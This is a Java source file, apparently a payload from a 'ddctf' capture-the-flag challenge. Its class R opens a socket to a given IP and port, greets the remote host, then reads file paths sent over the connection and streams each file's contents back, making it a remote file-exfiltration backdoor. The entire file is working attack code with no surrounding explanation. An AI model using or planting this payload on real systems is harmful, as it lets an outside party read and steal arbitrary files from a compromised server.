import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;

public class R {

    public R(String ip, Integer port) {
        new Thread(() -> {
            try {
                Socket socket = new Socket(ip,port);
                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
                bufferedWriter.write("hello ddctf!");
                bufferedWriter.newLine();
                bufferedWriter.flush();

                BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(socket.getInputStream()));
                while (true) {
                    String line;
                    while ((line = bufferedReader.readLine()) == null)
                        ;
                    try {
                        BufferedReader read = new BufferedReader(
                            new InputStreamReader(Files.newInputStream(Paths.get(line.trim()))));
                        String line2 = null;


                        while ((line2 = read.readLine()) != null) {
                            bufferedWriter.write(line2);
                            bufferedWriter.newLine();
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                        bufferedWriter.write("文件不存在");
                        bufferedWriter.newLine();
                    }
                    bufferedWriter.flush();
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }
}
